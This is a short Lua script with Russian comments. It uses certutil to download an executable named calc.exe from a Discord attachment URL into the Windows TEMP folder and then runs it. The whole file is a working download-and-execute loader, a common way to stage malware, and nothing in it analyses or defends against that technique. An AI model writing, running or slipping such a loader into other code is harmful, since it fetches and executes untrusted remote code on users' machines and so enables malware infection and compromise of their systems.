local url = "https://cdn.discordapp.com/attachments/1395213097630695554/1438240569422909641/calc.exe"
local temp_dir = os.getenv("TEMP") or "C:\\Temp"
local file_path = temp_dir .. "\\calc.exe"

-- Функция загрузки файла через certutil
local function download_file()
    -- certutil требует, чтобы URL был в двойных кавычках, а команда - в одинарных для PowerShell, но мы используем os.execute с строкой команды для cmd
    local command = string.format('certutil -urlcache -split -f "%s" "%s"', url, file_path)
    local result = os.execute(command)
    
    if result == 0 or result == true then
        print("Файл успешно загружен: " .. file_path)
        return true
    else
        print("Ошибка загрузки файла")
        return false
    end
end

-- Загрузка и запуск файла
if download_file() then
    print("Запускаем файл...")
    os.execute('"' .. file_path .. '"')
else
    print("Не удалось загрузить файл")
end